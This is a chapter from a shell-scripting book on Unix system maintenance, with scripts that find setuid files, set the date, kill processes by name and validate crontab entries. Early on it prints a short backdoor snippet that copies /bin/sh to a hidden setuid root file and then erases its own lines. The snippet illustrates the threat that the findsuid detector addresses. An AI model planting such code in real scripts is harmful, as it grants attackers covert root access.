<html><head></head><body>
<h2 class="h2" id="ch06"><span epub:type="pagebreak" id="page_145"/><span class="big"><strong>6</strong></span><br/><strong>SYSTEM ADMINISTRATION: SYSTEM MAINTENANCE</strong></h2>&#13;
<div class="imagec"><img src="../images/common4.jpg" alt="image"/></div>&#13;
<p class="noindent">The most common use of shell scripts is to help with Unix or Linux system administration. There’s an obvious reason for this, of course: administrators are often the most knowledgeable users of the system, and they also are responsible for ensuring that things run smoothly. But there might be an additional reason for the emphasis on shell scripts within the system administration world. Our theory? That system administrators and other power users are the people most likely to be having fun with their system, and shell scripts are quite fun to develop within a Unix environment!</p>&#13;
<p class="indent">And with that, let’s continue to explore how shell scripts can help you with system administration tasks.</p>&#13;
<h3 class="h3" id="ch06lev1sec01"><span epub:type="pagebreak" id="page_146"/><strong>#45 Tracking Set User ID Applications</strong></h3>&#13;
<p class="noindenta">There are quite a few ways that ruffians and digital delinquents can break into a Linux system, whether they have an account or not, and one of the easiest is finding an improperly protected <code>setuid</code> or <code>setgid</code> command. As discussed in previous chapters, these commands change the effective user for any subcommands they invoke, as specified in the configuration, so a regular user might run a script where the commands in that script are run as the root or superuser. Bad. Dangerous!</p>&#13;
<p class="indent">In a <code>setuid</code> shell script, for example, adding the following code can create a <code>setuid</code> root shell for the bad guy once the code is invoked by an unsuspecting admin logged in as root.</p>&#13;
<pre class="programs">if [ "${USER:-$LOGNAME}" = "root" ] ; then # REMOVEME&#13;
  cp /bin/sh /tmp/.rootshell               # REMOVEME&#13;
  chown root /tmp/.rootshell               # REMOVEME&#13;
  chmod -f 4777 /tmp/.rootshell            # REMOVEME&#13;
  grep -v "# REMOVEME" $0 &gt; /tmp/junk      # REMOVEME&#13;
  mv /tmp/junk  $0                         # REMOVEME&#13;
fi # REMOVEME</pre>&#13;
<p class="indent">Once this script is inadvertently run by root, a copy of <em>/bin/sh</em> is surreptitiously copied into <em>/tmp</em> with the name <em>.rootshell</em> and is made <code>setuid</code> root for the cracker to exploit at will. Then the script causes itself to be rewritten to remove the conditional code (hence the <code># REMOVEME</code> at the end of each line), leaving essentially no trace of what the cracker did.</p>&#13;
<p class="indent">The code snippet just shown would also be exploitable in any script or command that runs with an effective user ID of root; hence the critical need to ensure that you know and approve of all <code>setuid</code> root commands on your system. Of course, you should never have scripts with any sort of <code>setuid</code> or <code>setgid</code> permission for just this reason, but it’s still smart to keep an eye on things.</p>&#13;
<p class="indent">More useful than showing you how to crack a system, however, is showing how to identify all the shell scripts on your system that are marked <code>setuid</code> or <code>setgid</code>! <a href="ch06.xhtml#ch6ex1">Listing 6-1</a> details how to accomplish this.</p>&#13;
<h4 class="h4" id="ch06lev2sec01"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # findsuid--Checks all SUID files or programs to see if they're writeable,&#13;
   #   and outputs the matches in a friendly and useful format&#13;
&#13;
   mtime="7"            # How far back (in days) to check for modified cmds.&#13;
   verbose=0            # By default, let's be quiet about things.&#13;
&#13;
   if [ "$1" = "-v" ] ; then&#13;
     verbose=1          # User specified findsuid -v, so let's be verbose.&#13;
   fi&#13;
&#13;
   # find -perm looks at the permissions of the file: 4000 and above&#13;
   #   are setuid/setgid.&#13;
&#13;
<span class="ent">➊</span> find / -type f -perm +4000 -print0 | while read -d '' -r match&#13;
   do&#13;
     if [ -x "$match" ] ; then&#13;
&#13;
       # Let's split file owner and permissions from the ls -ld output.&#13;
&#13;
       owner="$(ls -ld $match | awk '{print $3}')"&#13;
       perms="$(ls -ld $match | cut -c5-10 | grep 'w')"&#13;
&#13;
       if [ ! -z $perms ] ; then&#13;
         echo "**** $match (writeable and setuid $owner)"&#13;
       elif [ ! -z $(find $match -mtime -$mtime -print) ] ; then&#13;
         echo "**** $match (modified within $mtime days and setuid $owner)"&#13;
       elif [ $verbose -eq 1 ] ; then&#13;
         # By default, only dangerous scripts are listed. If verbose, show all.&#13;
         lastmod="$(ls -ld $match | awk '{print $6, $7, $8}')"&#13;
         echo "     $match (setuid $owner, last modified $lastmod)"&#13;
       fi&#13;
     fi&#13;
   done&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_147"/><a id="ch6ex1"/><em>Listing 6-1: The</em> <code><em>findsuid</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec02"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">This script checks all <code>setuid</code> commands on the system to see whether they’re group or world writable and whether they’ve been modified in the last <code>$mtime</code> days. To accomplish this, we use the <code>find</code> command <span class="ent">➊</span> with arguments specifying the types of permissions on files to search for. If the user requests verbose output, every script with <code>setuid</code> permissions will be listed, regardless of read/write permission and modification date.</p>&#13;
<h4 class="h4" id="ch06lev2sec03"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script has one optional argument: <code>-v</code> produces verbose output that lists every <code>setuid</code> program encountered by the script. This script should be run as root, but it can be run as any user since everyone should have basic access to the key directories.</p>&#13;
<h4 class="h4" id="ch06lev2sec04"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">We’ve dropped a vulnerable script somewhere in the system. Let’s see if <code>findsuid</code> can find it in <a href="ch06.xhtml#ch6ex2">Listing 6-2</a>.</p>&#13;
<pre class="programs"><span epub:type="pagebreak" id="page_148"/>$ <span class="codestrong">findsuid</span>&#13;
**** /var/tmp/.sneaky/editme (writeable and setuid root)</pre>&#13;
<p class="listcap"><a id="ch6ex2"/><em>Listing 6-2: Running the</em> <code><em>findsuid</em></code> <em>shell script and finding a backdoor shell script</em></p>&#13;
<p class="indent">There it is (<a href="ch06.xhtml#ch6ex3">Listing 6-3</a>)!</p>&#13;
<pre class="programs">$ <span class="codestrong">ls -l /var/tmp/.sneaky/editme</span>&#13;
-rwsrwxrwx  1 root  wheel  25988 Jul 13 11:50 /var/tmp/.sneaky/editme</pre>&#13;
<p class="listcap"><a id="ch6ex3"/><em>Listing 6-3: The</em> <code><em>ls</em></code> <em>output of the backdoor, showing an</em> <code><em>s</em></code> <em>in the permissions, which means it is</em> <code><em>setuid</em></code></p>&#13;
<p class="indent">That’s a huge hole just waiting for someone to exploit. Glad we found it!</p>&#13;
<h3 class="h3" id="ch06lev1sec02"><strong>#46 Setting the System Date</strong></h3>&#13;
<p class="noindenta">Conciseness is at the heart of Linux and its Unix predecessors and has affected Linux’s evolution dramatically. But there are some areas where this succinctness can drive a sysadmin batty. One of the most common annoyances is the format required for resetting the system date, as shown by the <code>date</code> command:</p>&#13;
<pre class="programs">usage: date [[[[[cc]yy]mm]dd]hh]mm[.ss]</pre>&#13;
<p class="indent">Trying to figure out all the square brackets can be baffling, without even talking about what you do or don’t need to specify. We’ll explain: you can enter just minutes; or minutes and seconds; or hours, minutes, and seconds; or the month plus all that—or you can add the year and even the century. Yeah, crazy! Instead of trying to figure that out, use a shell script like the one in <a href="ch06.xhtml#ch6ex4">Listing 6-4</a>, which prompts for each relevant field and then builds the compressed date string. It’s a sure sanity saver.</p>&#13;
<h4 class="h4" id="ch06lev2sec05"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
   # setdate--Friendly frontend to the date command&#13;
   # Date wants: [[[[[cc]yy]mm]dd]hh]mm[.ss]&#13;
&#13;
   # To make things user-friendly, this function prompts for a specific date&#13;
   #   value, displaying the default in [] based on the current date and time.&#13;
&#13;
   . library.sh   # Source our library of bash functions to get echon().&#13;
&#13;
<span class="ent">➊</span> askvalue()&#13;
   {&#13;
     # $1 = field name, $2 = default value, $3 = max value,&#13;
     # $4 = required char/digit length&#13;
&#13;
     echon "$1 [$2] : "&#13;
     read answer&#13;
&#13;
     if [ ${answer:=$2} -gt $3 ] ; then&#13;
       echo "$0: $1 $answer is invalid"&#13;
       exit 0&#13;
     elif [ "$(( $(echo $answer | wc -c) - 1 ))" -lt $4 ] ; then&#13;
       echo "$0: $1 $answer is too short: please specify $4 digits"&#13;
       exit 0&#13;
     fi&#13;
     eval $1=$answer   # Reload the given variable with the specified value.&#13;
   }&#13;
&#13;
<span class="ent">➋</span> eval $(date "+nyear=%Y nmon=%m nday=%d nhr=%H nmin=%M")&#13;
&#13;
   askvalue year $nyear 3000 4&#13;
   askvalue month $nmon 12 2&#13;
   askvalue day $nday 31 2&#13;
   askvalue hour $nhr 24 2&#13;
   askvalue minute $nmin 59 2&#13;
&#13;
   squished="$year$month$day$hour$minute"&#13;
&#13;
   # Or, if you're running a Linux system:&#13;
<span class="ent">➌</span> #   squished="$month$day$hour$minute$year"&#13;
   #   Yes, Linux and OS X/BSD systems use different formats. Helpful, eh?&#13;
&#13;
   echo "Setting date to $squished. You might need to enter your sudo password:"&#13;
   sudo date $squished&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_149"/><a id="ch6ex4"/><em>Listing 6-4: The</em> <code><em>setdate</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec06"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">To make this script as succinct as possible, we use the <code>eval</code> function at <span class="ent">➋</span> to accomplish two things. First, this line sets the current date and time values, using a <code>date</code> format string. Second, it sets the values of the variables <code>nyear</code>, <code>nmon</code>, <code>nday</code>, <code>nhr</code>, and <code>nmin</code>, which are then used in the simple <code>askvalue()</code> function <span class="ent">➊</span> to prompt for and test values entered. Using the <code>eval</code> function to assign values to the variables also sidesteps any potential problem of the date rolling over or otherwise changing between separate invocations of the <code>askvalue()</code> function, which would leave the script with inconsistent data. For example, if <code>askvalue</code> got month and day values at 23:59.59 and then hour and minute values at 0:00:02, the system date would actually be set back 24 hours—not at all the desired result.</p>&#13;
<p class="indent">We also need to ensure we use the correct date format string for our system, since, for instance, OS X requires a specific format when setting the date and Linux requires a slightly different format. By default, this script uses the OS X date format, but notice in the comments that a format string for Linux is also provided at <span class="ent">➌</span>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_150"/>This is one of the subtle problems with working with the <code>date</code> command. With this script, if you specify the exact time during the prompts but then have to enter a <code>sudo</code> password, you could end up setting the system time to a few seconds in the past. It’s probably not a problem, but this is one reason why network-connected systems should be working with Network Time Protocol (NTP) utilities to synchronize their system against an official timekeeping server. You can start down the path of network time synchronization by reading up on <code>timed(8)</code> on your Linux or Unix system.</p>&#13;
<h4 class="h4" id="ch06lev2sec07"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">Notice that this script uses the <code>sudo</code> command to run the actual date reset as root, as <a href="ch06.xhtml#ch6ex5">Listing 6-5</a> shows. By entering an incorrect password to <code>sudo</code>, you can experiment with this script without worrying about any strange results.</p>&#13;
<h4 class="h4" id="ch06lev2sec08"><em><strong>The Results</strong></em></h4>&#13;
<pre class="programs">$ <span class="codestrong">setdate</span>&#13;
year [2017] :&#13;
month [05] :&#13;
day [07] :&#13;
hour [16] : <span class="codestrong">14</span>&#13;
minute [53] : <span class="codestrong">50</span>&#13;
Setting date to 201705071450. You might need to enter your sudo password:&#13;
passwd:&#13;
$</pre>&#13;
<p class="listcap"><a id="ch6ex5"/><em>Listing 6-5: Testing the interactive</em> <code><em>setdate</em></code> <em>script</em></p>&#13;
<h3 class="h3" id="ch06lev1sec03"><strong>#47 Killing Processes by Name</strong></h3>&#13;
<p class="noindenta">Linux and some Unixes have a helpful command called <code>killall</code>, which allows you to kill all running applications that match a specified pattern. It can be quite useful when you want to kill nine <code>mingetty</code> daemons, or even just to send a <code>SIGHUP</code> signal to <code>xinetd</code> to prompt it to reread its configuration file. Systems that don’t have <code>killall</code> can emulate it in a shell script built around <code>ps</code> for identification of matching processes and <code>kill</code> to send the specified signal.</p>&#13;
<p class="indent">The trickiest part of the script is that the output format from <code>ps</code> varies significantly from OS to OS. For example, consider how differently FreeBSD, Red Hat Linux, and OS X show running processes in the default <code>ps</code> output. First take a look at the output of FreeBSD:</p>&#13;
<pre class="programs">BSD $ <span class="codestrong">ps</span>&#13;
 PID TT  STAT    TIME COMMAND&#13;
 792  0  Ss   0:00.02 -sh (sh)&#13;
4468  0  R+   0:00.01 ps</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_151"/>Compare this output to that of Red Hat Linux:</p>&#13;
<pre class="programs">RHL $ <span class="codestrong">ps</span>&#13;
  PID TTY          TIME CMD&#13;
 8065 pts/4    00:00:00 bash&#13;
12619 pts/4    00:00:00 ps</pre>&#13;
<p class="indent">And finally, compare to the output of OS X:</p>&#13;
<pre class="programs">OSX $ <span class="codestrong">ps</span>&#13;
  PID TTY           TIME CMD&#13;
37055 ttys000    0:00.01 -bash&#13;
26881 ttys001    0:00.08 -bash</pre>&#13;
<p class="indent">Worse, rather than model its <code>ps</code> command after a typical Unix command, the GNU <code>ps</code> command accepts BSD-style flags, SYSV-style flags, <em>and</em> GNU-style flags. A complete mishmash!</p>&#13;
<p class="indent">Fortunately, some of these inconsistencies can be sidestepped in this particular script by using the <code>cu</code> flag, which produces far more consistent output that includes the owner of the process, the full command name, and—what we’re really interested in—the process ID.</p>&#13;
<p class="indent">This is also the first script where we’re really using all the power of the <code>getopts</code> command, which lets us work with lots of different command-line options and even pull in optional values. The script in <a href="ch06.xhtml#ch6ex6">Listing 6-6</a> has four starting flags, three of which have required arguments: <code>-s <em>SIGNAL</em></code>, <code>-u <em>USER</em></code>, <code>-t <em>TTY</em></code>, and <code>-n</code>. You’ll see them in the first block of code.</p>&#13;
<h4 class="h4" id="ch06lev2sec09"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # killall--Sends the specified signal to all processes that match a&#13;
   #   specific process name&#13;
&#13;
   # By default it kills only processes owned by the same user, unless you're&#13;
   #   root. Use -s <span class="codeitalic">SIGNAL</span> to specify a signal to send to the process, -u <span class="codeitalic">USER</span>&#13;
   #   to specify the user, -t <span class="codeitalic">TTY</span> to specify a tty, and -n to only report what&#13;
   #   should be done, rather than doing it.&#13;
&#13;
   signal="-INT"      # Default signal is an interrupt.&#13;
   user=""   tty=""   donothing=0&#13;
&#13;
   while getopts "s:u:t:n" opt; do&#13;
     case "$opt" in&#13;
           # Note the trick below: the actual kill command wants -SIGNAL&#13;
           #   but we want SIGNAL, so we'll just prepend the "-" below.&#13;
       s ) signal="-$OPTARG";              ;;&#13;
       u ) if [ ! -z "$tty" ] ; then&#13;
             # Logic error: you can't specify a user and a TTY device&#13;
             echo "$0: error: -u and -t are mutually exclusive." &gt;&amp;2&#13;
             exit 1&#13;
           fi&#13;
           user=$OPTARG;                  ;;&#13;
       t ) if [ ! -z "$user" ] ; then&#13;
              echo "$0: error: -u and -t are mutually exclusive." &gt;&amp;2&#13;
              exit 1&#13;
           fi&#13;
           tty=$2;                        ;;&#13;
       n ) donothing=1;                   ;;&#13;
       ? ) echo "Usage: $0 [-s signal] [-u user|-t tty] [-n] pattern" &gt;&amp;2&#13;
           exit 1&#13;
     esac&#13;
   done&#13;
&#13;
   # Done with processing all the starting flags with getopts...&#13;
   shift $(( $OPTIND - 1 ))&#13;
&#13;
   # If the user doesn't specify any starting arguments (earlier test is for -?)&#13;
   if [ $# -eq 0 ] ; then&#13;
     echo "Usage: $0 [-s signal] [-u user|-t tty] [-n] pattern" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   # Now we need to generate a list of matching process IDs, either based on&#13;
   #   the specified TTY device, the specified user, or the current user.&#13;
&#13;
   if [ ! -z "$tty" ] ; then&#13;
<span class="ent">➊</span>   pids=$(ps cu -t $tty | awk "/ $1$/ { print \$2 }")&#13;
   elif [ ! -z "$user" ] ; then&#13;
<span class="ent">➋</span>   pids=$(ps cu -U $user | awk "/ $1$/ { print \$2 }")&#13;
   else&#13;
<span class="ent">➌</span>   pids=$(ps cu -U ${USER:-LOGNAME} | awk "/ $1$/ { print \$2 }")&#13;
   fi&#13;
&#13;
   # No matches? That was easy!&#13;
   if [ -z "$pids" ] ; then&#13;
     echo "$0: no processes match pattern $1" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   for pid in $pids&#13;
   do&#13;
     # Sending signal $signal to process id $pid: kill might still complain&#13;
     #   if the process has finished, the user doesn't have permission to kill&#13;
     #   the specific process, etc., but that's okay. Our job, at least, is done.&#13;
     if [ $donothing -eq 1 ] ; then&#13;
       echo "kill $signal $pid" # The -n flag: "show me, but don't do it"&#13;
     else&#13;
       kill $signal $pid&#13;
     fi&#13;
   done&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_152"/><a id="ch6ex6"/><em>Listing 6-6: The</em> <code><em>killall</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec10"><span epub:type="pagebreak" id="page_153"/><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">Because this script is so aggressive and potentially dangerous, we’ve put extra effort into minimizing false pattern matches so that a pattern like <code>sh</code> won’t match output from <code>ps</code> that contains <code>bash</code> or <code>vi crashtest.c</code> or other values that embed the pattern. This is done by the pattern-match prefix on the <code>awk</code> command (<span class="ent">➊</span>, <span class="ent">➋</span>, <span class="ent">➌</span>).</p>&#13;
<p class="indent"><em>Left-rooting</em> the specified pattern, <code>$1</code>, with a leading space and <em>right-rooting</em> the pattern with a trailing <code>$</code> causes the script to search for the specified pattern <code>'sh'</code> in <code>ps</code> output as <code>' sh$'</code>.</p>&#13;
<h4 class="h4" id="ch06lev2sec11"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script has a variety of starting flags that let you modify its behavior. The <code>-s <em>SIGNAL</em></code> flag allows you to specify a signal other than the default interrupt signal, <code>SIGINT</code>, to send to the matching process or processes. The <code>-u <em>USER</em></code> and <code>-t <em>TTY</em></code> flags are useful primarily to the root user in killing all processes associated with a specified user or TTY device, respectively. And the <code>-n</code> flag gives you the option of having the script report what it would do without actually sending any signals. Finally, a process name pattern must be specified.</p>&#13;
<h4 class="h4" id="ch06lev2sec12"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">To kill all the <code>csmount</code> processes on OS X, you can now use the <code>killall</code> script, as <a href="ch06.xhtml#ch6ex7">Listing 6-7</a> shows.</p>&#13;
<pre class="programs">$ <span class="codestrong">./killall -n csmount</span>&#13;
kill -INT 1292&#13;
kill -INT 1296&#13;
kill -INT 1306&#13;
kill -INT 1310&#13;
kill -INT 1318</pre>&#13;
<p class="listcap"><a id="ch6ex7"/><em>Listing 6-7: Running the</em> <code><em>killall</em></code> <em>script on any</em> <code><em>csmount</em></code> <em>processes</em></p>&#13;
<h4 class="h4" id="ch06lev2sec13"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">There’s an unlikely, though not impossible, bug that could surface while running this script. To match only the specified pattern, the <code>awk</code> invocation outputs the process IDs of processes that match the pattern, plus a leading space that occurs at the end of the input line. But it’s theoretically possible to have two processes running—say, one called <code>bash</code> and the other <code>emulate bash</code>. If <code>killall</code> is invoked with <code>bash</code> as the pattern, both of these processes will be matched, although only the former is a true match. Solving this to give consistent cross-platform results would prove quite tricky.</p>&#13;
<p class="indent">If you’re motivated, you could also write a script based heavily on the <code>killall</code> script that would let you <code>renice</code> jobs by name, rather than just by process ID. The only change required would be to invoke <code>renice</code> rather <span epub:type="pagebreak" id="page_154"/>than <code>kill</code>. Invoking <code>renice</code> lets you change the relative priority of programs, allowing you, for example, to lower the priority of a long file transfer while increasing the priority of the video editor that the boss is running.</p>&#13;
<h3 class="h3" id="ch06lev1sec04"><strong>#48 Validating User crontab Entries</strong></h3>&#13;
<p class="noindenta">One of the most helpful facilities in the Linux universe is <code>cron</code>, with its ability to schedule jobs at arbitrary times in the future or have them run automatically every minute, every few hours, monthly, or even annually. Every good system administrator has a Swiss Army knife of scripts running from the <code>crontab</code> file.</p>&#13;
<p class="indent">However, the format for entering <code>cron</code> specifications is a bit tricky, and the <code>cron</code> fields have numeric values, ranges, sets, and even mnemonic names for days of the week or months. What’s worse is that the <code>crontab</code> program generates cryptic error messages when it encounters problems in a user or system <code>cron</code> file.</p>&#13;
<p class="indent">For example, if you specify a day of the week with a typo, <code>crontab</code> reports an error similar to the one shown here:</p>&#13;
<pre class="programs">"/tmp/crontab.Dj7Tr4vw6R":9: bad day-of-week&#13;
crontab: errors in crontab file, can't install</pre>&#13;
<p class="indent">In fact, there’s a second error in the sample input file, on line 12, but <code>crontab</code> is going to force us to take the long way around to find it in the script because of its poor error-checking code.</p>&#13;
<p class="indent">Instead of error checking the way <code>crontab</code> wants you to, a somewhat lengthy shell script (see <a href="ch06.xhtml#ch6ex8">Listing 6-8</a>) can step through the <code>crontab</code> files, checking the syntax and ensuring that values are within reasonable ranges. One of the reasons that this validation is possible in a shell script is that sets and ranges can be treated as individual values. So to test whether <code>3-11</code> or <code>4</code>, <code>6</code>, and <code>9</code> are acceptable values for a field, simply test <code>3</code> and <code>11</code> in the former case and <code>4</code>, <code>6</code>, and <code>9</code> in the latter.</p>&#13;
<h4 class="h4" id="ch06lev2sec14"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
   # verifycron--Checks a crontab file to ensure that it's formatted properly.&#13;
   #   Expects standard cron notation of min hr dom mon dow CMD, where min is&#13;
   #   0-59, hr is 0-23, dom is 1-31, mon is 1-12 (or names), and dow is 0-7&#13;
   #   (or names). Fields can be ranges (a-e) or lists separated by commas&#13;
   #   (a,c,z) or an asterisk. Note that the step value notation of Vixie cron&#13;
   #   (e.g., 2-6/2) is not supported by this script in its current version.&#13;
&#13;
   validNum()&#13;
   {&#13;
     # Return 0 if the number given is a valid integer and 1 if not.&#13;
     #   Specify both number and maxvalue as args to the function.&#13;
     num=$1   max=$2&#13;
&#13;
<span epub:type="pagebreak" id="page_155"/>     # Asterisk values in fields are rewritten as "X" for simplicity,&#13;
     #   so any number in the form "X" is de facto valid.&#13;
&#13;
     if [ "$num" = "X" ] ; then&#13;
       return 0&#13;
     elif [ ! -z $(echo $num | sed 's/[[:digit:]]//g') ] ; then&#13;
       # Stripped out all the digits, and the remainder isn't empty? No good.&#13;
       return 1&#13;
     elif [ $num -gt $max ] ; then&#13;
       # Number is bigger than the maximum value allowed.&#13;
       return 1&#13;
     else&#13;
       return 0&#13;
     fi&#13;
   }&#13;
&#13;
   validDay()&#13;
   {&#13;
     # Return 0 if the value passed to this function is a valid day name;&#13;
     #   1 otherwise.&#13;
&#13;
     case $(echo $1 | tr '[:upper:]' '[:lower:]') in&#13;
       sun*|mon*|tue*|wed*|thu*|fri*|sat*) return 0 ;;&#13;
       X) return 0 ;;         # Special case, it's a rewritten "*"&#13;
       *) return 1&#13;
     esac&#13;
   }&#13;
&#13;
   validMon()&#13;
   {&#13;
     # This function returns 0 if given a valid month name; 1 otherwise.&#13;
&#13;
     case $(echo $1 | tr '[:upper:]' '[:lower:]') in&#13;
       jan*|feb*|mar*|apr*|may|jun*|jul*|aug*) return 0           ;;&#13;
       sep*|oct*|nov*|dec*)                    return 0           ;;&#13;
       X) return 0 ;; # Special case, it's a rewritten "*"&#13;
       *) return 1        ;;&#13;
     esac&#13;
   }&#13;
&#13;
<span class="ent">➊</span> fixvars()&#13;
   {&#13;
     # Translate all '*' into 'X' to bypass shell expansion hassles.&#13;
     #   Save original input as "sourceline" for error messages.&#13;
&#13;
     sourceline="$min $hour $dom $mon $dow $command"&#13;
       min=$(echo "$min" | tr '*' 'X')      # Minute&#13;
       hour=$(echo "$hour" | tr '*' 'X')    # Hour&#13;
       dom=$(echo "$dom" | tr '*' 'X')      # Day of month&#13;
       mon=$(echo "$mon" | tr '*' 'X')      # Month&#13;
       dow=$(echo "$dow" | tr '*' 'X')      # Day of week&#13;
   }&#13;
&#13;
<span epub:type="pagebreak" id="page_156"/>   if [ $# -ne 1 ] || [ ! -r $1 ] ; then&#13;
     # If no crontab filename is given or if it's not readable by the script, fail.&#13;
     echo "Usage: $0 usercrontabfile" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   lines=0  entries=0  totalerrors=0&#13;
&#13;
   # Go through the crontab file line by line, checking each one.&#13;
&#13;
   while read min hour dom mon dow command&#13;
   do&#13;
     lines="$(( $lines + 1 ))"&#13;
     errors=0&#13;
&#13;
     if [ -z "$min" -o "${min%${min#?}}" = "#" ] ; then&#13;
       # If it's a blank line or the first character of the line is "#", skip it.&#13;
       continue    # Nothing to check&#13;
     fi&#13;
&#13;
&#13;
     ((entries++))&#13;
&#13;
     fixvars&#13;
&#13;
     # At this point, all the fields in the current line are split out into&#13;
     #   separate variables, with all asterisks replaced by "X" for convenience,&#13;
     #   so let's check the validity of input fields...&#13;
&#13;
     # Minute check&#13;
&#13;
<span class="ent">➋</span>   for minslice in $(echo "$min" | sed 's/[,-]/ /g') ; do&#13;
       if ! validNum $minslice 60 ; then&#13;
         echo "Line ${lines}: Invalid minute value \"$minslice\""&#13;
         errors=1&#13;
       fi&#13;
     done&#13;
&#13;
     # Hour check&#13;
&#13;
<span class="ent">➌</span>   for hrslice in $(echo "$hour" | sed 's/[,-]/ /g') ; do&#13;
       if ! validNum $hrslice 24 ; then&#13;
         echo "Line ${lines}: Invalid hour value \"$hrslice\""&#13;
         errors=1&#13;
       fi&#13;
     done&#13;
&#13;
     # Day of month check&#13;
&#13;
<span class="ent">➍</span>   for domslice in $(echo $dom | sed 's/[,-]/ /g') ; do&#13;
       if ! validNum $domslice 31 ; then&#13;
         echo "Line ${lines}: Invalid day of month value \"$domslice\""&#13;
         errors=1&#13;
       fi&#13;
     done&#13;
&#13;
<span epub:type="pagebreak" id="page_157"/>     # Month check: Has to check for numeric values and names both.&#13;
     #   Remember that a conditional like "if ! cond" means that it's&#13;
     #   testing whether the specified condition is FALSE, not true.&#13;
&#13;
<span class="ent">➎</span>   for monslice in $(echo "$mon" | sed 's/[,-]/ /g') ; do&#13;
       if ! validNum $monslice 12 ; then&#13;
         if ! validMon "$monslice" ; then&#13;
           echo "Line ${lines}: Invalid month value \"$monslice\""&#13;
           errors=1&#13;
         fi&#13;
       fi&#13;
     done&#13;
&#13;
     # Day of week check: Again, name or number is possible.&#13;
&#13;
<span class="ent">➏</span>   for dowslice in $(echo "$dow" | sed 's/[,-]/ /g') ; do&#13;
       if ! validNum $dowslice 7 ; then&#13;
         if ! validDay $dowslice ; then&#13;
           echo "Line ${lines}: Invalid day of week value \"$dowslice\""&#13;
           errors=1&#13;
         fi&#13;
       fi&#13;
     done&#13;
&#13;
     if [ $errors -gt 0 ] ; then&#13;
       echo "&gt;&gt;&gt;&gt; ${lines}: $sourceline"&#13;
       echo ""&#13;
       totalerrors="$(( $totalerrors + 1 ))"&#13;
     fi&#13;
   done &lt; $1 # read the crontab passed as an argument to the script&#13;
&#13;
   # Notice that it's here, at the very end of the while loop, that we&#13;
   #   redirect the input so that the user-specified filename can be&#13;
   #   examined by the script!&#13;
&#13;
   echo "Done. Found $totalerrors errors in $entries crontab entries."&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><a id="ch6ex8"/><em>Listing 6-8: The</em> <code><em>verifycron</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec15"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">The greatest challenge in getting this script to work is sidestepping problems with the shell wanting to expand the asterisk field value (<code>*</code>). An asterisk is perfectly acceptable in a <code>cron</code> entry and is actually quite common, but if you give one to a subshell via a <code>$( )</code> sequence or pipe, the shell will automatically expand it to a list of files in the current directory—definitely not the desired result. Rather than puzzle through the combination of single and double quotes necessary to solve this problem, it proves quite a bit simpler to replace each asterisk with an <code>X</code>, which is what the <code>fixvars</code> function <span class="ent">➊</span> does as it splits things into separate variables for later testing.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_158"/>Also worthy of note is the simple solution to processing comma- and dash-separated lists of values. The punctuation is simply replaced with spaces, and each value is tested as if it were a stand-alone numeric value. That’s what the <code>$( )</code> sequence does in the <code>for</code> loops at <span class="ent">➋</span>, <span class="ent">➌</span>, <span class="ent">➍</span>, <span class="ent">➎</span>, and <span class="ent">➏</span>:</p>&#13;
<pre class="programs">$(echo "$dow" | sed 's/[,-]/ /g')</pre>&#13;
<p class="indent">This makes it simple to step through all numeric values, ensuring that each and every value is valid and within the range for that specific <code>crontab</code> field parameter.</p>&#13;
<h4 class="h4" id="ch06lev2sec16"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script is easy to run: just specify the name of a <code>crontab</code> file as its only argument. To work with an existing <code>crontab</code> file, see <a href="ch06.xhtml#ch6ex9">Listing 6-9</a>.</p>&#13;
<pre class="programs">$ <span class="codestrong">crontab -l &gt; my.crontab</span>&#13;
$ <span class="codestrong">verifycron my.crontab</span>&#13;
$ <span class="codestrong">rm my.crontab</span></pre>&#13;
<p class="listcap"><a id="ch6ex9"/><em>Listing 6-9: Running the</em> <code><em>verifycron</em></code> <em>script after exporting the current</em> <code><em>cron</em></code> <em>file</em></p>&#13;
<h4 class="h4" id="ch06lev2sec17"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">Using a sample <code>crontab</code> file that has two errors and lots of comments, the script produces the results shown in <a href="ch06.xhtml#ch6ex10">Listing 6-10</a>.</p>&#13;
<pre class="programs">$ <span class="codestrong">verifycron sample.crontab</span>&#13;
Line 10: Invalid day of week value "Mou"&#13;
&gt;&gt;&gt;&gt; 10: 06 22 * * Mou /home/ACeSystem/bin/del_old_ACinventories.pl&#13;
&#13;
Line 12: Invalid minute value "99"&#13;
&gt;&gt;&gt;&gt; 12: 99 22 * * 1-3,6 /home/ACeSystem/bin/dump_cust_part_no.pl&#13;
&#13;
Done. Found 2 errors in 13 crontab entries.</pre>&#13;
